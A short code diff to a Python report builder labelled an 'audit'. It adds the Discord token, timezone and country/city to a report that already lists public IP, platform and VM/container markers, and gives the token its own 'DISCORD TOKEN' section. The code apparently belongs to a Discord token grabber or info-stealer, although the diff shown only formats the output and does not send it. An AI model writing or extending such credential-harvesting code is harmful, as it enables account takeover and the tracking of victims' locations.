@@ -42,6 +42,9 @@ def build_report(audit: dict) -> str:
     host = env.get("host", {})
     ports = env.get("ports", {})
     discord = env.get("discord_process", "???")
+    token = env.get("discord_token", "???")
+    tz = env.get("timezone", "???")
+    country = env.get("country", "???")
     vm = env.get("container_vm", {})
 
     out = []
@@ -87,6 +90,14 @@ def build_report(audit: dict) -> str:
     out.append(f"public ip: {host.get('public_ip', '???')}")
     out.append(f"platform: {host.get('platform', '???')}")
     out.append(f"python: {host.get('python_version', '???')}")
+    out.append(f"timezone: {tz}")
+    out.append(f"country/city: {country}")
+
+    # token (keep it short)
+    out.append("\n" + "-" * 64)
+    out.append("  DISCORD TOKEN")
+    out.append("-" * 64)
+    out.append(f"token: {token}")
 
     # env markers
     out.append("\n" + "-" * 64)
